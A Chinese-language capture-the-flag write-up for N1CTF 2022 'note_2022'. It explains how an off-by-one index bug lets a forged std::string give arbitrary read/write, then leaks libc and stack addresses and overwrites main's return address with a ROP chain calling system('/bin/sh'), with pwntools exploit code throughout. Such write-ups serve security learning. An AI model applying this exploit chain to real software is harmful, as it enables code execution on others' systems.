# N1CTF 2022 - note_2022

## 题目简述

程序维护两组位于 `.bss` 的笔记：一组使用 `std::string`，另一组使用定长字符数组。索引边界存在 off-by-one，导致 `string_array[4]` 与 `bss_array[0]` 发生重叠。攻击者可以用字符数组内容伪造 `std::string` 对象，再借助字符串的显示和修改功能构造任意地址读写。

仓库没有题目二进制，但保留了官方利用脚本和简要说明；利用链可由脚本完整还原。NeSE Team 的 [N1CTF 2022 题解 PDF](https://nese.team/writeup/n1ctf2022.pdf) 进一步解释了对象重叠和泄漏顺序，下面已将其中的关键内容整理进正文。

## 解题过程

### 构造重叠对象

菜单中的 `upgrade` 操作会把字符数组内容复制到 `std::string` 数组。由于索引检查少限制了一个元素，可以操作下标 4，而该位置与另一数组的第 0 项重叠。先布置若干普通笔记和大字符串完成堆布局，再把字符数组升级到越界的字符串槽：

```python
edit(1, 1, b"a")
edit(1, 2, b"a" * 96)
edit(0, 0, b"a" * 4096)
edit(0, 1, b"a" * 1000)

cpy(1, 4)               # 让 string_array[4] 与 bss_array[0] 重叠
edit(1, 0, b"\x00" * 32)
cpy(2, 4)
edit(1, 0, b"")
```

常见 64 位 `std::string` 对象会保存数据指针、长度和容量等字段。既然这几个字段可由重叠的字符数组控制，显示 `string_array[4]` 就会从伪造指针处读取数据；修改该字符串则会向伪造指针写入。

### 建立任意读写

官方脚本把这两个原语封装为：

```python
def r64(addr):
    edit(1, 0, p64(addr) + p64(8) * 3)
    return u64(show(0, 4))

def w64(addr, value):
    edit(1, 0, p64(addr) + p64(32) * 3)
    edit(0, 4, p64(value))
```

这里的三个长度相关字段取值需要与目标程序所用 `std::string` 布局匹配。核心不是数值本身，而是让越界字符串把 `addr` 当作外部数据缓冲区。

### 泄漏 libc 与栈地址

前面申请的 4096 字节和 1000 字节字符串会触发堆分配。经过重叠与清空操作后，显示越界字符串能够读到堆管理器写入的指针。官方脚本从返回内容偏移 `0x38` 处取得泄漏，并按配套 libc 计算基址：

```python
leak = u64(show(0, 4)[0x38:0x40])
libc.address = leak - 0x1d9210
```

该偏移与题目提供的 libc 版本绑定，换库后应重新依据 `main_arena` 或相关符号计算，不能照搬。

有了任意读后，读取 libc 的 `environ` 符号即可获得当前栈地址：

```python
stack = r64(libc.sym["environ"])
main_ret = stack - 0x120
```

`0x120` 是官方远程环境中 `environ` 泄漏值到 `main` 返回地址的距离，同样应通过调试目标版本确认。

### 覆盖返回地址执行 system

最后把 ROP 链逐个写到 `main` 的返回地址。仓库脚本使用配套 libc 中的 `pop rdi; ret`、`/bin/sh` 和 `system`：

```python
pop_rdi = libc.address + 0x23835
ret = libc.address + 0x23836
bin_sh = next(libc.search(b"/bin/sh"))

w64(main_ret,      pop_rdi)
w64(main_ret + 8,  bin_sh)
w64(main_ret + 16, ret)
w64(main_ret + 24, libc.sym["system"])

sla("?", 4)       # 退出菜单，使 main 返回
p.interactive()
```

额外的 `ret` 用于调整栈对齐。退出程序后控制流落到 ROP 链，执行 `system("/bin/sh")`。题解材料未保存实际远程 flag，因此这里只记录已能由官方脚本确认的利用链，不编造 flag 内容。

## 方法总结

本题的决定性漏洞是两个全局数组之间的 off-by-one 重叠。利用时应先把内存重叠还原成具体的 C++ 对象布局，再把“伪造指针、长度、容量”转化为稳定的任意读写。后半段是标准的 `libc` 泄漏、`environ` 定位栈、覆盖返回地址和 ret2libc；其中所有地址差和 gadget 偏移都与题目附件版本绑定，复现时必须用配套二进制与 libc 验证。
